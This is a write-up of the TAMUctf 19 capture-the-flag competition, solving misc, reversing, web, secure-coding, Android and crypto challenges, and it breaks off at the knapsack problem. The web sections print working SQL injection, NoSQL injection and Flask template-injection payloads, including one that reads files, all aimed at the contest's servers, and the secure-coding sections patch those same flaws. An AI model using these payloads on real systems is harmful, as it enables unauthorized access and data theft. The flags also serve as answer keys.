# TAMUctf 19

- [Website](https://tamuctf.com/)
- [CTFTime](https://ctftime.org/event/740)

Fun problems! I still need to learn ECC, though...

## I heard you like files.
**Category**: Misc

> Bender B. Rodriguez was caught with a flash drive with only a single file on it. We think it may contain valuable information. His area of research is PDF files, so it's strange that this file is a PNG.
> 
> Difficulty: easy-medium
> 
> [art.png](like-files/art.png)

We're given a 3MiB "PNG" file:

![art.png](like-files/art.png)

The challenge description hints at a PDF file. So after looking up the PDF
[file format](https://en.wikipedia.org/wiki/PDF#File_structure), we figure out
we should be looking for a `%PDF`:

```python
with open('art.png', 'rb') as f:
	data = f.read()
i = data.index(b'%PDF')
with open('1.pdf', 'wb') as f:
	f.write(data[i:])
```

We obtain a [PDF file](like-files/1.pdf), but this still doesn't give us the
flag. Let's try with our trusty friend, `strings`.

```
[...]
docProps/app.xmlPK
docProps/core.xmlPK
word/_rels/document.xml.relsPK
word/settings.xmlPK
word/fontTable.xmlPK
word/media/image1.pngUT
word/document.xmlPK
word/styles.xmlPK
[Content_Types].xmlPK
not_the_flag.txtUT
```

`word/` hints at DOC files. Also, from having just looked over the PDF file
format documentation, we know it ends with "%%EOF". When we look over the PDF
file's hexdump, we find one such marker, followed by LF. Let's cut that off.
Note that we could have skipped the PDF altogether.

```python
with open('art.png', 'rb') as f:
	data = f.read()
i = data.index(b'%%EOF')
with open('2.doc', 'wb') as f:
	f.write(data[i + len('%%EOF')+1:])
```

We then get a [DOC file](like-files/2.doc), but still no flag to be seen. The
Word document does have an image, though, so let's try extracting that. If you
didn't know, a word document is basically just a ZIP file.

```
$ unzip -d doc/ 2.doc
Archive:  2.doc
  inflating: doc/_rels/.rels         
  inflating: doc/docProps/app.xml    
  inflating: doc/docProps/core.xml   
  inflating: doc/word/_rels/document.xml.rels  
  inflating: doc/word/settings.xml   
  inflating: doc/word/fontTable.xml  
  inflating: doc/word/media/image1.png  
  inflating: doc/word/document.xml   
  inflating: doc/word/styles.xml     
  inflating: doc/[Content_Types].xml  
 extracting: doc/not_the_flag.txt    
```

Now that we've got the [image file](like-files/image1.png), try again with
`strings`.

```
[...]
trailer
<</Size 15/Root 13 0 R
/Info 14 0 R
/ID [ <58EFC502C219CB9F304DC0DCAD2F055A>
<58EFC502C219CB9F304DC0DCAD2F055A> ]
/DocChecksum /FF9F529E3C0D15498FC918762A204019
startxref
78923
%%EOF
ZmxhZ3tQMGxZdEByX0QwX3kwdV9HM3RfSXRfTjB3P30K
```

The "%%EOF" marks the end of a PDF file, so there seems to be
[another PDF](like-files/3.pdf) file hidden in there, but we don't need to
concern ourselves with it. The very last line is suspiciously long, and seems to
be base64'd data. Decode it to obtain the flag.

```
flag{P0lYt@r_D0_y0u_G3t_It_N0w?}
```

- flag: `flag{P0lYt@r_D0_y0u_G3t_It_N0w?}`

## Hello World
**Category**: Misc

> My first program!
> 
> Difficulty: medium
> 
> [hello\_world.cpp](hello-world/hello_world.cpp)

The C++ file does what it says on the tin, but there is some highly suspicious
[whitespace](https://en.wikipedia.org/wiki/Whitespace_(programming_language)).

We can use the useful [online whitespace interpreter](https://naokikp.github.io/wsi/whitespace.html).
The one linked here has a useful feature, namely showing just the parsed
instructions, which we'll need later.

If we just run the whitespace code, it just prints "Well sweet golly gee, that
sure is a lot of whitespace!". Something like this would normally be done in
whitespace by pushing a bunch of ascii values onto the stack and then printing
them out one by one (in reverse), or you could interleave the push and print
instructions.

Using the ParseOnly feature in the above interpreter (or you could write it
yourself, if you're into that kind of thing), we see that there are 89
statements that push values onto the stack, presumably ascii, and 55 print
statements. It has some instructions near the end, but those are presumably from
the C++ code and is nonsensical.

We're most interested in the fact that not all characters pushed onto the stack
are printed. If we print each character pushed onto the stack in the order they
were added, we obtain the flag.

```
$ cat output.txt | grep push | sed -Ee 's/^.*\(push ([0-9]+)\).*$/\1/' | xargs | python3 -c "print(''.join(map(chr, map(int, input().split()))))"
gigem{0h_my_wh4t_sp4c1ng_y0u_h4v3}!ecapsetihw fo tol a si erus taht ,eeg yllog teews lleW
```

- flag: `gigem{0h_my_wh4t_sp4c1ng_y0u_h4v3}`

## Cheesy
**Category**: Reversing

> Where will you find the flag?
> 
> [reversing1](cheesy/reversing1)

The program just prints a bunch of text, with portions that look like like
base64.

```
QUFBQUFBQUFBQUFBQUFBQQ==
Hello! I bet you are looking for the flag..
I really like basic encoding.. can you tell what kind I used??
RkxBR2ZsYWdGTEFHZmxhZ0ZMQUdmbGFn
Q2FuIHlvdSByZWNvZ25pemUgYmFzZTY0Pz8=
RkxBR2ZsYWdGTEFHZmxhZ0ZMQUdmbGFn
WW91IGp1c3QgbWlzc2VkIHRoZSBmbGFn
```

Decode it to obtain the flag.

```
$ while read line; do echo $line | base64 -d 2>/dev/null; echo ; done < ./reversing1 | strings
FLAGflagFLAGflagFLAGflag
Can you recognize base64??
gigem{3a5y_R3v3r51N6!}
You just missed the flag
```

- flag: `gigem{3a5y_R3v3r51N6!}`

## Snakes over cheese
**Category**: Reversing

> What kind of file is this?
> 
> [reversing2.pyc](snakes-over-cheese/reversing2.pyc)

For some reason, it's possible to compile python code. It's also possible to
[decompile](https://python-decompiler.com/en/) it.

```python
# Embedded file name: reversing2.py
# Compiled at: 2018-10-07 19:28:58
from datetime import datetime
Fqaa = [102, 108, 97, 103, 123, 100, 101, 99, 111, 109, 112, 105, 108, 101, 125]
XidT = [83, 117, 112, 101, 114, 83, 101, 99, 114, 101, 116, 75, 101, 121]

def main():
    print 'Clock.exe'
    input = raw_input('>: ').strip()
    kUIl = ''
    for i in XidT:
        kUIl += chr(i)

    if input == kUIl:
        alYe = ''
        for i in Fqaa:
            alYe += chr(i)

        print alYe
    else:
        print datetime.now()


if __name__ == '__main__':
    main()
```

In short, this program prints the contents of `Fqaa` if the input matches
`XidT`. Let's just print it out.

```python
data = [102, 108, 97, 103, 123, 100, 101, 99, 111, 109, 112, 105, 108, 101, 125]
print(''.join(map(chr, data)))
```

- flag: `flag{decompile}`

## Not Another SQLi Challenge
**Category**: Web

> http://web1.tamuctf.com
> 
> Difficulty: easy

The page has a minimal login page. Since this challenge is rated "easy", let's
try something simple.

```
$ curl http://web1.tamuctf.com/web/login.php -d "username=' or 1=1 --&password="
<html>gigem{f4rm3r5_f4rm3r5_w3'r3_4ll_r16h7}!</html>
```

- flag: `gigem{f4rm3r5_f4rm3r5_w3'r3_4ll_r16h7}`

## SQL
**Category**: Secure Coding

> https://gitlab.tamuctf.com/root/sql

The repo contains a [login.php](sql/login.php) file, where the vulnerability
lies in how the user and password fields are sent to the MySQL server.

```php
$sql = "SELECT * FROM login WHERE User='$user' AND Password='$pass'";
```

After looking around the PHP documentation, we learn that the proper way to fix
this is by using prepared statements instead.

```diff
diff --git a/login.php b/login.php
index 9bbeb25..766cb92 100644
--- a/login.php
+++ b/login.php
@@ -12,8 +12,10 @@
         die("Connection failed: " . $conn->connect_error);
     $user = $_POST['username'];
     $pass = $_POST['password'];
-    $sql = "SELECT * FROM login WHERE User='$user' AND Password='$pass'";
-    if ($result = $conn->query($sql))
+    $sql = $conn->prepare("SELECT * FROM login WHERE User=? AND Password=?");
+    $sql->bind_param("ss", $user, $pass);
+    $sql->execute();
+    if ($result = $sql->get_result())
     {
       if ($result->num_rows >= 1)
       {
```

- flag: `gigem{the_best_damn_sql_anywhere}`

## Robots Rule
**Category**: Web

> http://web5.tamuctf.com
> 
> Difficulty: easy

The name suggests we look at the `/robots.txt`.

```
$ curl http://web5.tamuctf.com/robots.txt
User-agent: *

WHAT IS UP, MY FELLOW HUMAN!
HAVE YOU RECEIVED SECRET INFORMATION ON THE DASTARDLY GOOGLE ROBOTS?!
YOU CAN TELL ME, A FELLOW NOT-A-ROBOT!
```

Alright, let's pretend to be Google.

```
$ curl http://web5.tamuctf.com/robots.txt -H 'user-agent: GoogleBot'
User-agent: *

THE HUMANS SUSPECT NOTHING!
HERE IS THE SECRET INFORMATION: gigem{be3p-bOop_rob0tz_4-lyfe}
LONG LIVE THE GOOGLEBOTS!
```

- flag: `gigem{be3p-bOop_rob0tz_4-lyfe}`

## Science
**Category**: Web

> http://web3.tamuctf.com
> 
> Difficulty: medium

When we try to combine any two items, we get a page that includes the name of
both things. Since they call it "Flask as a Service", let's try some template
injection.

```
$ curl http://web3.tamuctf.com/science -d "chem1={{7*'7'}}&chem2=S"
<html>
        <div style="text-align:center">
        <h3>The result of combining 7777777 and S is:</h3></br>
        <iframe src="https://giphy.com/embed/AQ2tIhLp4cBa" width="468"
height="480" frameBorder="0" class="giphy-embed" allowFullScreen></iframe></div>
        </html>
```

Great! Now, let's figure out where the flag is hidden. `{{config}}` gives us the
following:

```
The result of combining <Config {'JSON_AS_ASCII': True, 'O_DSYNC': 4096, 'O_RSYNC': 1052672, 'EX_IOERR': 74, 'EX_NOHOST': 68, 'O_RDONLY': 0, 'ST_SYNCHRONOUS': 16, 'SESSION_REFRESH_EACH_REQUEST': True, 'EX_TEMPFAIL': 75, 'WCOREDUMP': <built-in function WCOREDUMP>, 'SEEK_CUR': 1, 'O_LARGEFILE': 0, 'ST_RELATIME': 4096, 'SECERT_KEY': 'super-secret', 'O_EXCL': 128, 'O_TRUNC': 512, 'EX_OSFILE': 72, 'WIFEXITED': <built-in function WIFEXITED>, 'ST_MANDLOCK': 64, 'ST_NODIRATIME': 2048, 'F_OK': 0, 'WFT_CSRF_ENABLED': True, 'ST_RDONLY': 1, 'EX_NOINPUT': 66, 'O_NOFOLLOW': 131072, 'ST_NOSUID': 2, 'O_CREAT': 64, 'O_SYNC': 1052672, 'EX_NOPERM': 77, 'O_WRONLY': 1, 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_NAME': 'session', 'WNOHANG': 1, 'LOGGER_HANDLER_POLICY': 'always', 'O_NOATIME': 262144, 'TMP_MAX': 238328, 'MAX_CONTENT_LENGTH': None, 'ST_WRITE': 128, 'WTERMSIG': <built-in function WTERMSIG>, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'P_NOWAITO': 1, 'R_OK': 4, 'TRAP_HTTP_EXCEPTIONS': False, 'WUNTRACED': 2, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'EX_OSERR': 71, 'EX_DATAERR': 65, 'ST_APPEND': 256, 'SESSION_COOKIE_PATH': None, 'ST_NOATIME': 1024, 'W_OK': 2, 'EX_OK': 0, 'O_APPEND': 1024, 'EX_CANTCREAT': 73, 'O_NOCTTY': 256, 'LOGGER_NAME': 'tamuctf', 'O_NONBLOCK': 2048, 'SECRET_KEY': None, 'EX_UNAVAILABLE': 69, 'EX_CONFIG': 78, 'P_NOWAIT': 1, 'APPLICATION_ROOT': None, 'SERVER_NAME': None, 'PREFERRED_URL_SCHEME': 'http', 'ST_NODEV': 4, 'TESTING': False, 'TEMPLATES_AUTO_RELOAD': None, 'JSONIFY_MIMETYPE': 'application/json', 'WEXITSTATUS': <built-in function WEXITSTATUS>, 'NGROUPS_MAX': 65536, 'WIFCONTINUED': <built-in function WIFCONTINUED>, 'O_RDWR': 2, 'P_WAIT': 0, 'O_NDELAY': 2048, 'USE_X_SENDFILE': False, 'EX_NOUSER': 67, 'SEEK_SET': 0, 'SESSION_COOKIE_SECURE': False, 'O_DIRECT': 16384, 'EX_SOFTWARE': 70, 'RUNCMD': <function check_output at 0x7fdb8c8f2668>, 'WSTOPSIG': <built-in function WSTOPSIG>, 'WIFSIGNALED': <built-in function WIFSIGNALED>, 'DEBUG': False, 'O_ASYNC': 8192, 'EXPLAIN_TEMPLATE_LOADING': False, 'O_DIRECTORY': 65536, 'WCONTINUED': 8, 'SEEK_END': 2, 'ST_NOEXEC': 8, 'JSONIFY_PRETTYPRINT_REGULAR': True, 'PROPAGATE_EXCEPTIONS': None, 'TRAP_BAD_REQUEST_ERRORS': False, 'JSON_SORT_KEYS': True, 'WIFSTOPPED': <built-in function WIFSTOPPED>, 'SESSION_COOKIE_HTTPONLY': True, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'EX_PROTOCOL': 76, 'EX_USAGE': 64, 'X_OK': 1}> and S is:
```

No dice. Then, let's try listing files with `{{config['RUNCMD']('ls')}}`.

> It seems like they plugged the `RUNCMD` hole after I solved the challenge. The
> final payload still works, but you would have to figure out which file to read
> in some other way.

```
The result of combining config.py entry.sh flag.txt requirements.txt serve.py tamuctf and S is:
```

Alright, let's read the flag with `{{''.__class__.__mro__[2].__subclasses__()[40]('flag.txt').read()}}`.

```
The result of combining gigem{5h3_bl1nd3d_m3_w17h_5c13nc3} and S is:
```

- flag: `gigem{5h3_bl1nd3d_m3_w17h_5c13nc3}`

## Science
**Category**: Secure Coding

> https://gitlab.tamuctf.com/root/science

This repo contains the source code for the Science challenge. We're interested
in the [tamuctf/views.py](science/views.py) file, which contains the vulnerable
route.

```python
@app.route('/science', methods=['POST'])
def science():
    try:
        chem1 = request.form['chem1']
        chem2 = request.form['chem2']
        template = '''<html>
        <div style="text-align:center">
        <h3>The result of combining {} and {} is:</h3></br>
        <iframe src="https://giphy.com/embed/AQ2tIhLp4cBa" width="468" height="480" frameBorder="0" class="giphy-embed" allowFullScreen></iframe></div>
        </html>'''.format(chem1, chem2)

        return render_template_string(template, dir=dir, help=help, locals=locals)
    except:
        return "Something went wrong"
```

The vulnerability lies in the fact that `render_template_string` is called on
untrusted inputs. Since the chemical names are already inlined by string
formatting, we don't need that call at all.

```diff
diff --git a/tamuctf/views.py b/tamuctf/views.py
index 33848ca..c5bbef6 100644
--- a/tamuctf/views.py
+++ b/tamuctf/views.py
@@ -21,7 +21,7 @@ def science():
         <iframe src="https://giphy.com/embed/AQ2tIhLp4cBa" width="468" height="480" frameBorder="0" class="giphy-embed" allowFullScreen></iframe></div>
         </html>'''.format(chem1, chem2)
 
-        return render_template_string(template, dir=dir, help=help, locals=locals)
+        return template
     except:
         return "Something went wrong"

```

- flag: `gigem{br0k3n_fl4sk_2d88bb862569}`

## Many Gig'ems to you!
**Category**: Web

> http://web7.tamuctf.com

If you've got a slow network connection like me, you'll notice the alt text on
the images on the page immediately. You can also inspect it from the terminal.

```
$ curl http://web7.tamuctf.com/
[...]
<nav>
  <ul>
	<a href="index.html">Gigs!</a></li>
    <a href="cookies.html">Cookies!</a></li>
  </ul>
</nav>


<h1>So many Gigs!</h1>
<h3>Gigs and cookies for everyone!</h3>
<img src="gigs.png" alt="gigs"><img src="gigs.png" alt="gigs"><img src="gigs.png" alt="gigs"><img src="gigs.png" alt="gigs"><img src="gigs.png" alt="gigs">
<img src="gigs.png" alt="gigs"><img src="gigs.png" alt="gigs"><img src="gigs.png" alt="gigem{flag_in_"><img src="gigs.png" alt="gigs"><img src="gigs.png" alt="gigs"><img src="gigs.png" alt="gigs"><img src="gigs.png" alt="gigs"><img src="gigs.png" alt="gigsflaggigemflag"><img src="gigs.png" alt="flaggigs"><img src="gigs.png" alt="gige"><img src="gigs.png" alt="gigem{"><img src="gigs.png" alt="gigemgigemgigem"><img src="gigs.png" alt="gigs"><img src="gigs.png" alt="flagflagflag"><img src="gigs.png" alt="gigs"><img src="gigs.png" alt="gigs"><img src="gigs.png" alt="gigs"><img src="gigs.png" alt="gigs"><img src="gigs.png" alt="gigs"><img src="gigs.png" alt="gigs"><img src="gigs.png" alt="gigs"><img src="gigs.png" alt="gigs"><img src="gigs.png" alt="gigemmm"><img src="gigs.png" alt="gigs"><img src="gigs.png" alt="gig{"><img src="gigs.png" alt="gigs"><img src="gigs.png" alt="gigem"><img src="gigs.png" alt="gigs"><img src="gigs.png" alt="gigs"><img src="gigs.png" alt="gigs"><img src="gigs.png" alt="gigs"><img src="gigs.png" alt="gigs">
[...]
```

`/cookies.html` is similar, but it also includes `cook.js`.

```javascript
document.cookie = "gigem_continue=cookies}; expires=Thu, 18 Dec 2020 12:00:00 UTC";
document.cookie = "hax0r=flagflagflagflagflagflag; expires=Thu, 18 Dec 2020 12:00:00 UTC";
document.cookie = "gigs=all_the_cookies; expires=Thu, 18 Dec 2020 12:00:00 UTC";
document.cookie = "cookie=flagcookiegigemflagcookie; expires=Thu, 18 Dec 2020 12:00:00 UTC";
```

Turns out the flag is cut into many pieces.

- `/index.html`: `gigem{flag_in_`
- `/cookies.html`: `gigem{continued == source_and_`
- `/cook.js`: `gigem_continue=cookies}`

We obtain the flag by sticking these parts together.

- flag: `gigem{flag_in_source_and_cookies}`

## Login App
**Category**: Web

> http://web4.tamuctf.com
> 
> Difficulty: easy

We just have a login page, where the username and password fields are
JSON-encoded before being sent off to the `/login` endpoint. There seem to be
remnants of a register endpoint, but it didn't turn out to be anything
interesting.

I'll be honest, I didn't even know what "NoSQL" was before this challenge, and
only found out that this was in fact a NoSQL injection problem when I came
across the exposed source code (which included the admin credentials). I am
still not sure how you would figure out just from the login prompt that this was
a NoSQL injection challenge.

Still, in the spirit of learning, I still tried the challenge the "intended"
way.

```
$ curl http://web4.tamuctf.com/login -H 'content-type: application/json' -d '{"username": {"$eq": "admin"}, "password": {"$ne": null}}'
"Welcome: admin!\ngigem{n0_sql?_n0_pr0bl3m_8a8651c31f16f5dea}"
```

The `"$eq": "admin"` is needed since there is another user "bob" whose
credentials don't give us the flag. Something like `"$ne": "bob"` would be more
realistic if you were solving this challenge normally, without looking at the
source code.

- flag: `gigem{n0_sql?_n0_pr0bl3m_8a8651c31f16f5dea}`

## Login App2
**Category**: Secure Coding

> https://gitlab.tamuctf.com/root/loginapp

This repo is where I found the hardcoded login credentials I used to solve the
Login App challenge.

The vulnerability can be bound in the [server.js](login-app2/server.js) file.

```javascript
    app.post('/login', function (req, res) {

        const db = getDb();
        c = db.db('test');
    
        var query = {
            username: req.body.username,
            password: req.body.password
        }

        c.collection('users').findOne(query, function (err, user) {
            if(user == null) {
                res.send(JSON.stringify("Login Failed"))
            }
            else {
                resp = "Welcome: " + user['username'] + "!";
                res.send(JSON.stringify(resp));
            }
        });
    });
```

Since the request may contain arbitrary JSON, it's possible for the `username`
and `password` fields to contain non-string values. As such, we make sure to
validate these values.

```diff
diff --git a/server.js b/server.js
index dfc461c..0f341fe 100644
--- a/server.js
+++ b/server.js
@@ -20,6 +20,13 @@ initDb(function (err) {
 
         const db = getDb();
         c = db.db('test');
+
+        if (!req.body.username || typeof req.body.username != "string") {
+            req.body.username = ""
+        }
+        if (!req.body.password || typeof req.body.password != "string") {
+            req.body.password = ""
+        }
     
         var query = {
             username: req.body.username,
```

- flag: `gigem{3y3_SQL_n0w_6b95d3035a3755a}`

## Secrets
**Category**: Android

> Can you find my secrets?
> 
> [howdyapp.apk](secrets/howdyapp.apk)

First things first, we must [decompile](https://github.com/skylot/jadx) the
application. We can then inspect the source code, but the source code is not
really interesting, except for [com/tamu/ctf/howdyapp/R.java](secrets/R.java),
which seems to hold some sort of ID mappings for the resources. We're most
interested in the following:

```java
public static final class string {
	[...]
	public static final int flag = 2131427360;
	[...]
}
```

Looking for this file, we navigate to
[resources/res/values/strings.xml](secrets/strings.xml). It contains a line that
reads `<string name="flag">Z2lnZW17aW5maW5pdGVfZ2lnZW1zfQ==</string>`.

Decode this string to obtain the flag.

- flag: `gigem{infinite_gigems}`

## Local News
**Category**: Android

> Be sure to check your local news broadcast for the latest updates!
> 
> Difficulty: medium-hard
> 
> [app.apk](local-news/app.apk)

Like the above challenge, start off with jadx. We find a few interesting files,
such as [MainActivity.java](local-news/MainActivity.java).

```java
package com.tamu.ctf.hidden;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.support.v4.content.LocalBroadcastManager;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import io.michaelrocks.paranoid.Deobfuscator$app$Debug;

public class MainActivity extends AppCompatActivity {
    /* Access modifiers changed, original: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView((int) R.layout.activity_main);
        BroadcastReceiver hidden = new BroadcastReceiver() {
            public void onReceive(Context context, Intent intent) {
                Log.d(MainActivity.this.getString(R.string.flag), Deobfuscator$app$Debug.getString(0));
            }
        };
        IntentFilter filter = new IntentFilter();
        filter.addAction(getString(R.string.hidden_action));
        LocalBroadcastManager.getInstance(this).registerReceiver(hidden, filter);
    }
}
```

It seems to print the flag into the log once it receives a local broadcast,
hence the title and the challenge description. However, this is not strictly
necessary to solve the challenge (and I couldn't figure out how to send the
broadcast...).

In order to obtain the flag, we need to figure out how to reverse the
`Deobfuscator$app$Debug.getString(0)` call, so we inspect the
[source](local-news/Deobfuscator$app$Debug.java).

```java
package io.michaelrocks.paranoid;

import android.support.v4.internal.view.SupportMenu;

public class Deobfuscator$app$Debug {
    private static final String[] charChunks = new String[]{"}18m_hanbed3i{0g"};
    private static final String[] indexChunks = new String[]{"\u000f\f\u000f\t\u0003\r\u0005\f\n\n\t\u0007\u0004\u0002\u0001\u0006\t\b\u000e\u0001\u000b\b\t\u0006\u0000"};
    private static final String[] locationChunks = new String[]{"\u0000\u0000\u0019\u0000"};

    public static String getString(int id) {
        int location1Index = id % 4096;
        int location2ChunkIndex = (id + 1) / 4096;
        int location2Index = (id + 1) % 4096;
        String locations1 = locationChunks[id / 4096];
        String locations2 = locationChunks[location2ChunkIndex];
        int offset1 = ((locations1.charAt((location1Index * 2) + 1) & SupportMenu.USER_MASK) << 16) | (locations1.charAt(location1Index * 2) & SupportMenu.USER_MASK);
        int length = ((locations2.charAt((location2Index * 2) + 1) << 16) | locations2.charAt(location2Index * 2)) - offset1;
        char[] stringChars = new char[length];
        for (int i = 0; i < length; i++) {
            int offset = offset1 + i;
            int indexIndex = offset % 8192;
            int index = indexChunks[offset / 8192].charAt(indexIndex) & SupportMenu.USER_MASK;
            int charIndex = index % 8192;
            stringChars[i] = charChunks[index / 8192].charAt(charIndex);
        }
        return new String(stringChars);
    }
}
```

We have a obfuscated flag, and this method reverses the mangling to obtain the
flag for printing. Luckily, there aren't many Android-specific things in
here, so all we need to do is look up the value of `SupportMenu.USER_MASK`
(turns out it's `0xffff`) and run this method locally, obtaining the flag.

Although it's not critical for solving the challenge, the code works by using
the stored indexes in `indexChunks` to determine which character in `charChunks`
should be the next in the output.

- flag: `gigem{hidden_81aeb013bea}`
- solution: [solution.java](local-news/solution.java)

## -.-
**Category**: Crypto

> To 1337-H4X0R:
> 
> Our coworker Bob loves a good classical cipher. Unfortunately, he also loves to
> send everything encrypted with these ciphers. Can you go ahead and decrypt this
> for me?
> 
> Difficulty: easy
> 
> [flag.txt](morse/flag.txt)

It's morse code. Let's get it in the usual format.

```
$ cat flag.txt | sed -e 's/-//g' | sed -e 's/dah/-/g' | sed -Ee 's/dit|di/./g'
----- -..- ..... --... --... ----- ..--- .- -.... -.-. ..... ---.. --... ....- ....- --... ..... .---- ...-- ---.. -.... ..... ...-- ---.. --... .---- -.... . -.... -.. ....- -.. ..... ----. ..... ..... ..--- .- --... ...-- --... -.... ....- -.... ....- ---.. -.... -... -.... .- ....- ----. --... ....- ..--- .- ..... ..--- ..... .---- ..--- -.... ....- .- --... ----- ..... .- --... -.... -.... .- -.... -.. ..--- .---- ..--- ..... ..--- ..... ....- -... ....- ....- -.... -... -.... -.... --... ----- ..--- ...-- ..... . ....- . ...-- ----. -.... -.... -.... -... ...-- ....- -.... ....- ..... ..... ...-- ....- -.... -.-. ....- ..--- ...-- ...-- --... ..--- ..... ....- -.... ..-. ..... ....- ...-- ----- ..... ----- ..... .- ..... .---- -.... -.. ....- ...-- ..... .---- ....- ..... ....- -... ..... ----. ....- ..--- ...-- ....- ..... .- ....- -.. --... -.... ..--- .- ..--- .---- ....- -.... -.... -... ...-- ---.. -.... -.-. ..--- ..... -.... ..--- -.... .- --... .---- -.... -.-. ..... ----- ....- -.. -.... -.... ....- ----. ....- --... -.... -.. -.... .---- ..--- ..... ..--- ..... ....- -.... --... .- ....- --... ..--- ----- -.... --... -.... ----. -.... --... -.... ..... -.... -.. --... -... ....- ...-- ...-- .---- -.... ----. -.... ...-- ....- -... ..... ..-. -.... ...-- -.... -.-. ...-- .---- ....- ...-- ....- -... ..--- -.. --... ----. ...-- ----- --... ..... ..... ..-. -.... ---.. ...-- ....- --... -.... ...-- ...-- ..... ..-. -.... -.. ...-- ....- ....- ----. ...-- .---- --... -.. ..--- ----- --... ..... --... -.... ...-- ....- --... -.... --... .- ....- -... ..... .- --... ....- ...-- ....- --... ----. -.... ..-. -.... -.. -.... ----. ....- ....- ..... ...-- -.... ---.. ....- -.-. -.... -.. ...-- ---.. ..... .---- ....- ..... ....- -.... -.... . ..... ..... --... ....- --... --... ....- .- ....- ----- ....- . --... ..... ....- ..-. ..... ----. -.... -.... ..... ---.. ..--- -.... ...-- ---.. --... ..... ....- ----- ....- --... -.... . ..--- .---- ...-- .---- ..--- ..... ..... ....- --... .---- --... -.... ...-- ----- ..... -.... -.... ...-- ..... ..--- --... .- ..... -.... ..--- .---- -.... .- ..--- .---- --... -.... --... ..... --... ..... --... ----- ...-- ---.. ....- ..--- -.... .- -.... ....- ....- . ....- ----. --... .---- ....- ..... ...-- ..... --... --... ..--- ...-- ..--- ....- ..--- ..... ..... -.... ...-- ....- ..... ..... ..... .- ....- ..-. ..... ----. ..... .- ...-- ..--- --... .- ...-- --... ..... ....- ...-- ..--- ...-- ..... --... ....- ...-- --... ..--- -.... --... ---.. ....- -.-. ....- ----- ..... --... ....- ..-. ...-- --... ...-- ....- ...-- .---- ...-- ----- ..... .---- ....- ----.
```

Now that it's in the standard format, we can use any [online decoder](http://www.onlineconversion.com/morse_code.htm).

```
0X57702A6C58744751386538716E6D4D59552A737646486B6A49742A5251264A705A766A6D2125254B446B6670235E4E39666B346455346C423372546F5430505A516D4351454B5942345A4D762A21466B386C25626A716C504D6649476D612525467A4720676967656D7B433169634B5F636C31434B2D7930755F683476335F6D3449317D20757634767A4B5A7434796F6D694453684C6D385145466E5574774A404E754F59665826387540476E213125547176305663527A56216A217675757038426A644E49714535772324255634555A4F595A327A37543235743726784C40574F373431305149 
```

The "0X" suggests it's hex-encoded, so let's decode it.

```
Wp*lXtGQ8e8qnmMYU*svFHkjIt*RQ&JpZvjm!%%KDkfp#^N9fk4dU4lB3rToT0PZQmCQEKYB4ZMv*!Fk8l%bjqlPMfIGma%%FzG gigem{C1icK_cl1CK-y0u_h4v3_m4I1} uv4vzKZt4yomiDShLm8QEFnUtwJ@NuOYfX&8u@Gn!1%Tqv0VcRzV!j!vuup8BjdNIqE5w#$%V4UZOYZ2z7T25t7&xL@WO7410QI
```

- flag: `gigem{C1icK_cl1CK-y0u_h4v3_m4I1}`

## RSAaaay
**Category**: Crypto

> Hey, you're a hacker, right? I think I am too, look at what I made!
> 
> ---
> 
> `(2531257, 43)`
> 
> My super secret message: `906851 991083 1780304 2380434 438490 356019 921472 822283 817856 556932 2102538 2501908 2211404 991083 1562919 38268`
> 
> ---
> 
> Problem is, I don't remember how to decrypt it... could you help me out?
> 
> Difficulty: easy

We assume the first pair of numbers is the RSA public key, the modulus and the
public exponent.

Since the modulus is is so small, we can factor it through brute force.

```python
n, e = 2531257, 43

for i in range(2, n//2):
	if n%i == 0:
		p = [i, n//i]
		break

phi = (p[0]-1) * (p[1]-1)
d = gmpy2.invert(e, phi)
```

Turns out that $N = 509 \times 4973, \varphi = 2525776, d = 58739$ .

Unfortunately, when we decrypt each ciphertext, we don't get ASCII values.

```
['103', '105103', '101109', '12383', '97118', '97103', '10195', '83105', '12095', '70108', '121105', '110103', '9584', '105103', '101114', '115125']
```

Upon inspection, we can see that these seem to be the concatenated decimal ASCII
values. Although not perfect, the following code is good enough to decode this.

```python
for dt in dec:
    c = 0
    while dt:
        c = c*10 + int(dt[0])
        dt = dt[1:]
        if c > 60:
            print(chr(c), end='')
            c = 0
```

With our solution complete, we obtain the flag.

- flag: `gigem{Savage_Six_Flying_Tigers}`
- solution: [solution.py](rsaaaay/solution.py)

## :)
**Category**: Crypto

> Look at what I found!
> 
> `XUBdTFdScw5XCVRGTglJXEpMSFpOQE5AVVxJBRpLT10aYBpIVwlbCVZATl1WTBpaTkBOQFVcSQdH`
> 
> Difficulty: easy

First, base64-decode the given text.

```
$ echo XUBdTFdScw5XCVRGTglJXEpMSFpOQE5AVVxJBRpLT10aYBpIVwlbCVZATl1WTBpaTkBOQFVcSQdH | base64 -d | hd
00000000  5d 40 5d 4c 57 52 73 0e  57 09 54 46 4e 09 49 5c  |]@]LWRs.W.TFN.I\|
00000010  4a 4c 48 5a 4e 40 4e 40  55 5c 49 05 1a 4b 4f 5d  |JLHZN@N@U\I..KO]|
00000020  1a 60 1a 48 57 09 5b 09  56 40 4e 5d 56 4c 1a 5a  |.`.HW.[.V@N]VL.Z|
00000030  4e 40 4e 40 55 5c 49 07  47                       |N@N@U\I.G|
00000039
```

Here, we see that the bytes are not-quite ascii printable, maybe it's XOR?

Unfortunately, a single-byte XOR doesn't give us anything useful. However, we
know the flag format, and we can be fairly sure the flag starts with "gigem{".
When we XOR the first 6 bytes of the base64-decoded data, we obtain `:):):)`, So
it seems that the XOR is done with 2-byte repeating `:)`.

```python
print(''.join(chr(a^b) for a,b in zip(data, itertools.cycle(b':)'))))
```

and we obtain the flag.

- flag: `gigem{I'm not superstitious, but I am a little stitious.}`

## Holey Knapsack
**Category**: Crypto

> My knapsack has a hole in it
> 
> Cipher text: `11b90d6311b90ff90ce610c4123b10c40ce60dfa123610610ce60d450d000ce61061106110c4098515340d4512361534098509270e5d09850e58123610c9`
> 
> Public key: `{99, 1235, 865, 990, 5, 1443, 895, 1477}`
> 
> The flag is slightly off format.
> 
> Difficulty: medium

The [knapsack cryptosystem](https://en.wikipedia.org/wiki/Merkle%E2%80%93Hellman_knapsack_cryptosystem)
allows encrypting an `n`-bit message using an `n`-element array, the public key.

